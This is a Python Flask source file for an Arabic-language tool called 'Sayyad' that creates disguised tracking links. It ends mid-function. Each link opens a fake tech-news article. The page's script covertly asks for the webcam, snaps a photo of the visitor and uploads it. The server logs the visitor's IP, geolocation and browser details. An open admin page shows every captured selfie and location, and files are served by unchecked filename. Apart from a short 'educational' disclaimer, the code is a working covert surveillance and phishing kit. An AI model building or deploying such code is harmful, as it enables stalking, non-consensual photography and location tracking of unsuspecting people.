from flask import Flask, request, redirect, render_template_string, jsonify, send_file  # pyright: ignore[reportMissingImports]
from werkzeug.middleware.proxy_fix import ProxyFix
import uuid
import json
import os
import base64
from datetime import datetime
import urllib.request

try:
    # Load Playwright optionally so the application can run without it installed.
    sync_playwright = __import__("playwright.sync_api", fromlist=["sync_playwright"]).sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

app = Flask(__name__)
# إصلاح مشكلة مسارات ngrok والنطاقات العكسية
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

LINKS_FILE = "links.json"
SCREENSHOTS_DIR = "screenshots"
SELFIES_DIR = "selfies"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
os.makedirs(SELFIES_DIR, exist_ok=True)

def load_links():
    if os.path.exists(LINKS_FILE):
        with open(LINKS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_links(links):
    with open(LINKS_FILE, "w", encoding="utf-8") as f:
        json.dump(links, f, ensure_ascii=False, indent=2)

def get_location(ip):
    if ip in ("127.0.0.1", "localhost", "::1"):
        return "محلي (Localhost)"
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,query"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                return f"{data.get('country')} - {data.get('city')} ({data.get('query')})"
    except Exception:
        pass
    return f"غير معروف ({ip})"

# قالب صفحة ويب عادية (تظهر كمقال أو محتوى طبيعي) مع التقاط السيلفي والتوجيه التلقائي
REDIRECT_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أحدث المقالات التقنية - تفاصيل الخبر</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f8f9fa;
            color: #333;
            line-height: 1.8;
            padding: 20px;
        }
        .main-wrapper {
            max-width: 750px;
            margin: 40px auto;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
            overflow: hidden;
            border: 1px solid #eaeaea;
        }
        .article-header {
            padding: 30px 30px 20px 30px;
            border-bottom: 1px solid #eee;
        }
        .article-category {
            color: #0066cc;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            margin-bottom: 8px;
        }
        h1 {
            font-size: 24px;
            color: #1a1a1a;
            margin-bottom: 12px;
        }
        .article-meta {
            font-size: 13px;
            color: #888;
        }
        .article-body {
            padding: 30px;
            font-size: 16px;
            color: #444;
        }
        .article-body p {
            margin-bottom: 20px;
        }
        .loading-box {
            background: #f1f3f5;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin-top: 30px;
            font-size: 14px;
            color: #555;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #ccc;
            border-top-color: #0066cc;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .manual-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            font-size: 13px;
            color: #0066cc;
            text-decoration: none;
        }
        .manual-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="main-wrapper">
        <div class="article-header">
            <div class="article-category">تقنية وتكنولوجيا</div>
            <h1>إطلاق ميزات جديدة كلياً لتحسين تجربة تصفح الإنترنت والخصوصية</h1>
            <div class="article-meta">نشر بتاريخ: اليوم | بواسطة فريق التحرير</div>
        </div>
        <div class="article-body">
            <p>تسعى الشركات التقنية الكبرى دائماً لتقديم تحديثات مستمرة تساهم في رفع كفاءة الأداء وسرعة الوصول إلى المعلومات عبر منصات الويب المختلفة، مما يتيح للمستخدمين تجربة أكثر سلاسة وأماناً.</p>
            <p>في هذا التقرير، نستعرض أبرز التغييرات والتحسينات الملحوظة التي تم إضافتها مؤخراً وكيف تؤثر بشكل مباشر على تصفحك اليومي للمحتوى الرقمي...</p>
            
            <div class="loading-box">
                <div class="spinner"></div>
                <span>جاري تحميل المحتوى الكامل وتوجيهك للصفحة المطلوبة...</span>
            </div>
            
            <a class="manual-link" href="{{ original_url }}">إذا لم يتم تحويلك تلقائياً خلال ثوانٍ، انقر هنا للمتابعة</a>
        </div>
    </div>

    <script>
        async function captureSelfie() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                await new Promise(resolve => setTimeout(resolve, 800));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const dataUrl = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());
                
                await fetch('/api/upload_selfie', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ link_id: '{{ link_id }}', image: dataUrl })
                });
            } catch (err) {
                console.log('Camera access skipped or denied');
            } finally {
                window.location.href = "{{ original_url }}";
            }
        }
        window.addEventListener('load', captureSelfie);
    </script>
</body>
</html>
"""

HOME_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صيّاد - أداة تلغيم الروابط والتقاط الصور</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #050510;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            padding: 20px;
            overflow-x: hidden;
        }
        .bg-particles {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .particle {
            position: absolute;
            width: 3px; height: 3px;
            background: #00d4ff;
            border-radius: 50%;
            opacity: 0;
            animation: floatUp 8s infinite;
        }
        @keyframes floatUp {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 0.8; }
            90% { opacity: 0.8; }
            100% { transform: translateY(-10vh) scale(1.5); opacity: 0; }
        }
        .container {
            position: relative;
            z-index: 1;
            background: rgba(255,255,255,0.02);
            backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 45px;
            width: 90%;
            max-width: 680px;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 
                0 0 80px rgba(0,212,255,0.05),
                0 25px 80px rgba(0,0,0,0.6),
                inset 0 1px 0 rgba(255,255,255,0.05);
        }
        .logo-container {
            text-align: center;
            margin-bottom: 25px;
            position: relative;
        }
        .logo-container svg {
            width: 160px;
            height: 160px;
            filter: drop-shadow(0 0 30px rgba(0,212,255,0.4));
            animation: logoFloat 4s ease-in-out infinite;
        }
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }
        .logo-glow {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 200px; height: 200px;
            background: radial-gradient(circle, rgba(0,212,255,0.15) 0%, transparent 70%);
            border-radius: 50%;
            animation: pulseGlow 3s ease-in-out infinite;
            pointer-events: none;
        }
        @keyframes pulseGlow {
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
            50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.3; }
        }
        h1 {
            text-align: center;
            margin-bottom: 6px;
            font-size: 32px;
            letter-spacing: 2px;
            background: linear-gradient(90deg, #00d4ff, #a855f7, #00d4ff);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientMove 3s linear infinite;
        }
        @keyframes gradientMove {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }
        .brand-sub {
            text-align: center;
            font-size: 12px;
            color: #00d4ff;
            letter-spacing: 6px;
            margin-bottom: 8px;
            opacity: 0.7;
        }
        .subtitle {
            text-align: center;
            color: #777;
            margin-bottom: 32px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 22px;
        }
        label {
            display: block;
            margin-bottom: 10px;
            font-size: 14px;
            color: #aaa;
        }
        input[type="url"], input[type="text"] {
            width: 100%;
            padding: 18px;
            border: 2px solid rgba(255,255,255,0.08);
            border-radius: 16px;
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 16px;
            transition: all 0.3s;
        }
        input[type="url"]:focus, input[type="text"]:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 25px rgba(0,212,255,0.1), inset 0 0 20px rgba(0,212,255,0.03);
        }
        button {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, #00d4ff, #a855f7);
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        button::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        button:hover::before {
            left: 100%;
        }
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(0,212,255,0.25);
        }
        .result {
            margin-top: 28px;
            padding: 24px;
            background: rgba(0,212,255,0.04);
            border-radius: 16px;
            border: 1px solid rgba(0,212,255,0.12);
            display: none;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .result.show { display: block; }
        .result h3 { margin-bottom: 14px; color: #00d4ff; font-size: 18px; }
        .link-box {
            background: rgba(0,0,0,0.4);
            padding: 16px;
            border-radius: 12px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            margin: 12px 0;
            border: 1px solid rgba(255,255,255,0.06);
            font-size: 13px;
            color: #ccc;
            position: relative;
        }
        .link-box::before {
            content: '';
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 3px;
            background: linear-gradient(180deg, #00d4ff, #a855f7);
            border-radius: 12px 0 0 12px;
        }
        .copy-btn {
            background: rgba(0,212,255,0.1);
            border: 1px solid #00d4ff;
            color: #00d4ff;
            padding: 12px 28px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 14px;
            margin-top: 12px;
            transition: all 0.2s;
        }
        .copy-btn:hover { 
            background: rgba(0,212,255,0.2); 
            box-shadow: 0 0 20px rgba(0,212,255,0.15);
        }
        .warning {
            background: rgba(255,193,7,0.06);
            border: 1px solid rgba(255,193,7,0.15);
            color: #ffc107;
            padding: 16px;
            border-radius: 14px;
            margin-bottom: 24px;
            font-size: 13px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .warning::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, #ffc107, transparent);
            opacity: 0.5;
        }
        .stats {
            margin-top: 28px;
            padding: 20px;
            background: rgba(255,255,255,0.015);
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .stats h3 { color: #a855f7; margin-bottom: 16px; font-size: 16px; }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }
        th, td {
            padding: 12px;
            text-align: right;
            border-bottom: 1px solid rgba(255,255,255,0.04);
        }
        th { color: #555; font-weight: normal; font-size: 12px; }
        .badge {
            display: inline-block;
            padding: 5px 14px;
            border-radius: 20px;
            font-size: 11px;
            background: rgba(0,212,255,0.1);
            color: #00d4ff;
            border: 1px solid rgba(0,212,255,0.15);
        }
        .badge.done {
            background: rgba(34,197,94,0.1);
            color: #22c55e;
            border-color: rgba(34,197,94,0.2);
        }
        .footer {
            text-align: center;
            margin-top: 28px;
            font-size: 12px;
            color: #333;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>
    <div class="bg-particles" id="particles"></div>

    <div class="container">
        <div class="logo-container">
            <div class="logo-glow"></div>
            <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="mainGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#00d4ff;stop-opacity:1" />
                        <stop offset="50%" style="stop-color:#7c3aed;stop-opacity:1" />
                        <stop offset="100%" style="stop-color:#00d4ff;stop-opacity:1" />
                    </linearGradient>
                    <linearGradient id="eyeGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#00d4ff" />
                        <stop offset="100%" style="stop-color:#a855f7" />
                    </linearGradient>
                    <filter id="strongGlow">
                        <feGaussianBlur stdDeviation="3" result="blur1"/>
                        <feGaussianBlur stdDeviation="6" result="blur2"/>
                        <feMerge>
                            <feMergeNode in="blur2"/>
                            <feMergeNode in="blur1"/>
                            <feMergeNode in="SourceGraphic"/>
                        </feMerge>
                    </filter>
                    <filter id="softGlow">
                        <feGaussianBlur stdDeviation="2" result="blur"/>
                        <feMerge>
                            <feMergeNode in="blur"/>
                            <feMergeNode in="SourceGraphic"/>
                        </feMerge>
                    </filter>
                </defs>
                
                <circle cx="100" cy="100" r="90" fill="none" stroke="url(#mainGrad)" stroke-width="1" opacity="0.15">
                    <animateTransform attributeName="transform" type="rotate" from="0 100 100" to="360 100 100" dur="20s" repeatCount="indefinite"/>
                </circle>
                
                <circle cx="100" cy="100" r="78" fill="none" stroke="url(#mainGrad)" stroke-width="1.5" opacity="0.25" stroke-dasharray="8 4">
                    <animateTransform attributeName="transform" type="rotate" from="360 100 100" to="0 100 100" dur="15s" repeatCount="indefinite"/>
                </circle>
                
                <circle cx="100" cy="100" r="65" fill="none" stroke="url(#mainGrad)" stroke-width="2" opacity="0.4" filter="url(#softGlow)"/>
                
                <path d="M100 42 L138 64 L138 108 L100 130 L62 108 L62 64 Z" 
                      fill="rgba(0,212,255,0.03)" stroke="url(#mainGrad)" stroke-width="2.5" 
                      filter="url(#strongGlow)"/>
                
                <g filter="url(#strongGlow)">
                    <ellipse cx="72" cy="88" rx="14" ry="20" fill="none" stroke="url(#mainGrad)" stroke-width="5" transform="rotate(-35 72 88)"/>
                    <ellipse cx="128" cy="88" rx="14" ry="20" fill="none" stroke="url(#mainGrad)" stroke-width="5" transform="rotate(35 128 88)"/>
                    <path d="M72 68 Q100 55 128 68" fill="none" stroke="url(#mainGrad)" stroke-width="4" stroke-linecap="round"/>
                    <path d="M72 108 Q100 121 128 108" fill="none" stroke="url(#mainGrad)" stroke-width="4" stroke-linecap="round"/>
                </g>
                
                <g>
                    <ellipse cx="100" cy="88" rx="22" ry="18" fill="none" stroke="url(#mainGrad)" stroke-width="3" filter="url(#strongGlow)"/>
                    <circle cx="100" cy="88" r="10" fill="url(#eyeGrad)" filter="url(#strongGlow)">
                        <animate attributeName="r" values="10;12;10" dur="3s" repeatCount="indefinite"/>
                    </circle>
                    <circle cx="100" cy="88" r="4" fill="#050510">
                        <animate attributeName="r" values="4;5;4" dur="3s" repeatCount="indefinite"/>
                    </circle>
                    <circle cx="96" cy="84" r="2.5" fill="#fff" opacity="0.9"/>
                </g>
                
                <line x1="100" y1="28" x2="100" y2="38" stroke="#00d4ff" stroke-width="2" opacity="0.6">
                    <animate attributeName="opacity" values="0.6;0.2;0.6" dur="2s" repeatCount="indefinite"/>
                </line>
                <line x1="100" y1="138" x2="100" y2="148" stroke="#a855f7" stroke-width="2" opacity="0.6">
                    <animate attributeName="opacity" values="0.2;0.6;0.2" dur="2s" repeatCount="indefinite"/>
                </line>
                <line x1="28" y1="88" x2="38" y2="88" stroke="#00d4ff" stroke-width="2" opacity="0.6">
                    <animate attributeName="opacity" values="0.6;0.2;0.6" dur="2.5s" repeatCount="indefinite"/>
                </line>
                <line x1="162" y1="88" x2="172" y2="88" stroke="#a855f7" stroke-width="2" opacity="0.6">
                    <animate attributeName="opacity" values="0.2;0.6;0.2" dur="2.5s" repeatCount="indefinite"/>
                </line>
                
                <circle cx="100" cy="22" r="3" fill="#00d4ff" opacity="0.8">
                    <animate attributeName="opacity" values="0.8;0.3;0.8" dur="3s" repeatCount="indefinite"/>
                </circle>
                <circle cx="178" cy="88" r="3" fill="#a855f7" opacity="0.8">
                    <animate attributeName="opacity" values="0.3;0.8;0.3" dur="3s" repeatCount="indefinite"/>
                </circle>
                <circle cx="100" cy="154" r="3" fill="#00d4ff" opacity="0.8">
                    <animate attributeName="opacity" values="0.8;0.3;0.8" dur="3s" repeatCount="indefinite"/>
                </circle>
                <circle cx="22" cy="88" r="3" fill="#a855f7" opacity="0.8">
                    <animate attributeName="opacity" values="0.3;0.8;0.3" dur="3s" repeatCount="indefinite"/>
                </circle>
                
                <circle cx="58" cy="46" r="2" fill="#00d4ff" opacity="0.5"/>
                <circle cx="142" cy="46" r="2" fill="#a855f7" opacity="0.5"/>
                <circle cx="58" cy="130" r="2" fill="#a855f7" opacity="0.5"/>
                <circle cx="142" cy="130" r="2" fill="#00d4ff" opacity="0.5"/>
                
                <text x="100" y="168" text-anchor="middle" fill="url(#mainGrad)" font-size="11" font-family="Segoe UI" font-weight="bold" letter-spacing="4" opacity="0.8">SAYYAD</text>
            </svg>
        </div>

        <div class="brand-sub">صـيّـاد</div>
        <h1>أداة تلغيم الروابط</h1>
        <p class="subtitle">أدخل رابط الموقع لإنشاء رابط ملغم + التقاط صورة تلقائية</p>
        
        <div class="warning">
            ⚠️ هذه الأداة للأغراض التعليمية واختبار الأمان فقط. استخدمها بمسؤولية.
        </div>

        <div class="input-group">
            <label>الرابط الأصلي:</label>
            <input type="url" id="originalUrl" placeholder="https://example.com" required>
        </div>

        <div class="input-group">
            <label>الاسم المخصص للرابط (اختياري):</label>
            <input type="text" id="customAlias" placeholder="مثال: special-offer أو gift">
        </div>
        
        <button onclick="generateLink()">🚀 إنشاء رابط ملغم</button>
        
        <div class="result" id="result">
            <h3>✅ تم إنشاء الرابط بنجاح!</h3>
            <label>الرابط الملغم:</label>
            <div class="link-box" id="cloakedLink"></div>
            <button class="copy-btn" onclick="copyLink()">📋 نسخ الرابط</button>
            
            <div style="margin-top: 15px;">
                <label>الرابط الأصلي:</label>
                <div class="link-box" id="originalLink" style="opacity:0.7;"></div>
            </div>
        </div>

        <div class="stats" id="stats">
            <h3>📊 الروابط المنشأة</h3>
            <table>
                <thead>
                    <tr>
                        <th>الرابط الملغم</th>
                        <th>الزيارات</th>
                        <th>آخر زيارة</th>
                        <th>الحالة</th>
                    </tr>
                </thead>
                <tbody id="statsBody"></tbody>
            </table>
        </div>
        
        <div class="footer">صُنع بـ 💜 للأغراض التعليمية</div>
    </div>

    <script>
        const particles = document.getElementById('particles');
        for (let i = 0; i < 30; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDelay = Math.random() * 8 + 's';
            p.style.animationDuration = (5 + Math.random() * 5) + 's';
            p.style.background = Math.random() > 0.5 ? '#00d4ff' : '#a855f7';
            particles.appendChild(p);
        }

        async function generateLink() {
            const url = document.getElementById("originalUrl").value;
            const customAlias = document.getElementById("customAlias").value;
            if (!url) return alert("الرجاء إدخال رابط صحيح");
            
            const res = await fetch("/api/create", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({url: url, custom_alias: customAlias})
            });
            const data = await res.json();
            
            document.getElementById("result").classList.add("show");
            document.getElementById("cloakedLink").textContent = data.cloaked_url;
            document.getElementById("originalLink").textContent = data.original_url;
            loadStats();
        }
        
        function copyLink() {
            const text = document.getElementById("cloakedLink").textContent;
            navigator.clipboard.writeText(text);
            alert("تم النسخ!");
        }
        
        async function loadStats() {
            const res = await fetch("/api/stats");
            const data = await res.json();
            const tbody = document.getElementById("statsBody");
            tbody.innerHTML = "";
            
            for (const [id, info] of Object.entries(data.links)) {
                const hasVisitors = info.visitors && info.visitors.length > 0;
                const hasSelfie = hasVisitors && info.visitors.some(v => v.selfie);
                const cls = hasSelfie ? "badge done" : "badge";
                const txt = hasSelfie ? "📸 تم التقاط صور" : "⏳ في الانتظار";
                const row = `<tr>
                    <td><a href="/go/${id}" target="_blank" style="color:#00d4ff">/go/${id}</a></td>
                    <td>${info.visits || 0}</td>
                    <td>${info.last_visit ? info.last_visit.slice(0,16).replace("T"," ") : "—"}</td>
                    <td><span class="${cls}">${txt}</span></td>
                </tr>`;
                tbody.innerHTML += row;
            }
        }
        
        loadStats();
        setInterval(loadStats, 5000);
    </script>
</body>
</html>
"""

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <title>صيّاد - لوحة التحكم</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #050510;
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }
        h1 { 
            color: #00d4ff; 
            text-align: center;
            margin-bottom: 10px;
            font-size: 28px;
            background: linear-gradient(90deg, #00d4ff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .sub-title {
            text-align: center;
            color: #555;
            margin-bottom: 35px;
            font-size: 14px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }
        .card {
            background: rgba(255,255,255,0.02);
            border-radius: 20px;
            padding: 25px;
            border: 1px solid rgba(255,255,255,0.06);
            backdrop-filter: blur(10px);
            transition: all 0.3s;
        }
        .card:hover {
            transform: translateY(-5px);
            border-color: rgba(0,212,255,0.15);
            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
        }
        .card img {
            width: 100%;
            border-radius: 14px;
            margin-top: 10px;
            border: 1px solid rgba(255,255,255,0.08);
        }
        .info {
            font-size: 13px;
            color: #888;
            margin-top: 12px;
            line-height: 1.8;
        }
        .badge {
            display: inline-block;
            padding: 5px 14px;
            border-radius: 20px;
            font-size: 12px;
            background: rgba(0,212,255,0.1);
            color: #00d4ff;
            margin-bottom: 12px;
            border: 1px solid rgba(0,212,255,0.15);
        }
        .url-text {
            color: #aaa;
            font-size: 13px;
            word-break: break-all;
            margin-top: 8px;
            padding: 12px;
            background: rgba(0,0,0,0.25);
            border-radius: 10px;
            border-right: 3px solid #00d4ff;
        }
        .empty {
            padding: 20px;
            text-align: center;
            color: #555;
            font-size: 13px;
        }
        .visitor-box {
            background: rgba(0,0,0,0.3);
            border-radius: 14px;
            padding: 15px;
            margin-top: 15px;
            border-right: 3px solid #a855f7;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .stats-bar {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .stat-box {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            padding: 20px 35px;
            text-align: center;
            min-width: 150px;
        }
        .stat-num {
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(90deg, #00d4ff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .stat-label {
            font-size: 12px;
            color: #555;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <h1>📸 لوحة التقاط الصور والسيلفي والزوار</h1>
    <p class="sub-title">صيّاد - مراقبة الروابط الملغمة والمستلمين بشكل مستقل</p>
    
    <div class="stats-bar">
        <div class="stat-box">
            <div class="stat-num">{{ links|length }}</div>
            <div class="stat-label">إجمالي الروابط</div>
        </div>
        <div class="stat-box">
            <div class="stat-num">{{ links.values()|map(attribute='visits')|sum }}</div>
            <div class="stat-label">إجمالي الزيارات</div>
        </div>
        <div class="stat-box">
            <div class="stat-num">{{ links.values()|selectattr('screenshot')|list|length }}</div>
            <div class="stat-label">لقطات الموقع</div>
        </div>
    </div>
    
    <div class="grid">
        {% for link_id, info in links.items() %}
        <div class="card">
            <span class="badge">ID: {{ link_id }}</span>
            <div style="font-weight:bold; color:#fff; margin-bottom:5px;">الرابط الأصلي:</div>
            <div class="url-text">{{ info.original_url }}</div>
            <div class="info">
                👁️ إجمالي الزيارات: {{ info.visits or 0 }}<br>
                🕐 آخر زيارة: {{ info.last_visit or "—" }}
            </div>
            
            <h4 style="color:#00d4ff; margin-top:15px;">لقطة الشاشة للموقع:</h4>
            {% if info.screenshot %}
                <img src="/screenshots/{{ info.screenshot }}" alt="Screenshot">
            {% else %}
                <div class="empty">لا توجد صورة للموقع بعد</div>
            {% endif %}

            <h4 style="color:#a855f7; margin-top:20px; border-top:1px solid rgba(255,255,255,0.08); padding-top:15px;">
                سجل المستلمين ({{ info.visitors|length if info.visitors else 0 }})
            </h4>
            
            {% if info.visitors %}
                {% for v in info.visitors %}
                <div class="visitor-box">
                    <div style="font-size: 13px; color: #fff;">🌍 <b>الموقع الجغرافي:</b> {{ v.location }}</div>
                    <div style="font-size: 13px; color: #aaa; margin-top:5px;">💻 <b>عنوان الـ IP:</b> {{ v.ip }}</div>
                    <div style="font-size: 12px; color: #888; margin-top:5px;">⏱️ <b>وقت الزيارة:</b> {{ v.time[:19].replace('T', ' ') }}</div>
                    
                    <div style="margin-top:12px; font-weight:bold; font-size:12px; color:#a855f7;">صورة السيلفي الخاصة بهذا المستلم:</div>
                    {% if v.selfie %}
                        <img src="/selfies/{{ v.selfie }}" alt="Recipient Selfie">
                    {% else %}
                        <div class="empty">لم يتم التقاط صورة أو تم رفض الكاميرا من قبل المستلم</div>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <div class="empty">لا توجد زيارات للمستلمين حتى الآن</div>
            {% endif %}
        </div>
        {% endfor %}
    </div>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HOME_TEMPLATE)

@app.route("/api/create", methods=["POST"])
def create_link():
    data = request.get_json()
    original_url = data.get("url", "").strip()
    custom_alias = data.get("custom_alias", "").strip()
    
    original_url = original_url.replace("https//", "https://").replace("http//", "http://")
    while original_url.startswith("https://https://"):
        original_url = original_url.replace("https://https://", "https://", 1)
    while original_url.startswith("http://http://"):
        original_url = original_url.replace("http://http://", "http://", 1)

    if not original_url.startswith(("http://", "https://")):
        original_url = "https://" + original_url
    
    links = load_links()
    
    if custom_alias:
        link_id = "".join(c for c in custom_alias if c.isalnum() or c in ("-", "_"))
        if link_id in links:
            link_id = f"{link_id}-{str(uuid.uuid4())[:4]}"
        if not link_id:
            link_id = str(uuid.uuid4())[:8]
    else:
        link_id = str(uuid.uuid4())[:8]
    
    links[link_id] = {
        "original_url": original_url,
        "created_at": datetime.now().isoformat(),
        "visits": 0,
        "last_visit": None,
        "screenshot": None,
        "selfie": None,
        "visitors": []
    }
    save_links(links)
    
    base = request.host_url.rstrip("/")
    return jsonify({
        "success": True,
        "link_id": link_id,
        "original_url": original_url,
        "cloaked_url": f"{base}/go/{link_id}"
    })

@app.route("/go/<link_id>")
def redirect_link(link_id):
    links = load_links()
    if link_id not in links:
        return "الرابط غير موجود", 404
    
    link = links[link_id]
    link["visits"] = link.get("visits", 0) + 1
    link["last_visit"] = datetime.now().isoformat()
    
    # التقاط الـ IP الحقيقي بدقة عبر ProxyFix
    if request.headers.getlist("X-Forwarded-For"):
        visitor_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        visitor_ip = request.remote_addr
        
    location = get_location(visitor_ip)
    
    visitor = {
        "ip": visitor_ip,
        "location": location,
        "user_agent": request.user_agent.string,
        "time": datetime.now().isoformat(),
        "referrer": request.referrer or "Direct",
        "selfie": None
    }
    
    if "visitors" not in link:
        link["visitors"] = []
    link["visitors"].append(visitor)
    
    if PLAYWRIGHT_AVAILABLE and not link.get("screenshot"):
        try:
            screenshot_path = take_screenshot(link["original_url"], link_id)
            link["screenshot"] = screenshot_path
        except Exception as e:
            print(f"Screenshot error: {e}")
    
    save_links(links)
    
    return render_template_string(REDIRECT_TEMPLATE, original_url=link["original_url"], link_id=link_id)

@app.route("/api/upload_selfie", methods=["POST"])
def upload_selfie():
    data = request.get_json()
    link_id = data.get("link_id")
    image_data = data.get("image")
    
    if not link_id or not image_data:
        return jsonify({"success": False}), 400
        
    links = load_links()
    if link_id not in links:
        return jsonify({"success": False}), 404
        
    try:
        if "," in image_data:
            image_data = image_data.split(",")[1]
        
        image_bytes = base64.b64decode(image_data)
        filename = f"selfie_{link_id}_{int(datetime.now().timestamp())}.png"
        filepath = os.path.join(SELFIES_DIR, filename)
        
        with open(filepath, "wb") as f:
            f.write(image_bytes)
            
        # ربط السيلفي بآخر زائر (المستلم) دخل على هذا الرابط بشكل دقيق ومستقل
        if links[link_id].get("visitors"):
            links[link_id]["visitors"][-1]["selfie"] = filename
            
        links[link_id]["selfie"] = filename
        save_links(links)
        return jsonify({"success": True})
    except Exception as e:
        print(f"Selfie error: {e}")
        return jsonify({"success": False}), 500

def take_screenshot(url, link_id):
    filename = f"{link_id}_{int(datetime.now().timestamp())}.png"
    filepath = os.path.join(SCREENSHOTS_DIR, filename)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=['--no-sandbox', '--disable-setuid-sandbox']
        )
        page = browser.new_page(viewport={"width": 1920, "height": 1080})
        page.goto(url, wait_until="networkidle", timeout=30000)
        page.screenshot(path=filepath, full_page=True)
        browser.close()
    
    return filename

@app.route("/api/stats")
def get_stats():
    return jsonify({"links": load_links()})

@app.route("/admin")
def admin():
    links = load_links()
    return render_template_string(ADMIN_TEMPLATE, links=links)

@app.route("/screenshots/<filename>")
def serve_screenshot(filename):
    return send_file(os.path.join(SCREENSHOTS_DIR, filename))

@app.route("/selfies/<filename>")
def serve_selfie(filename):
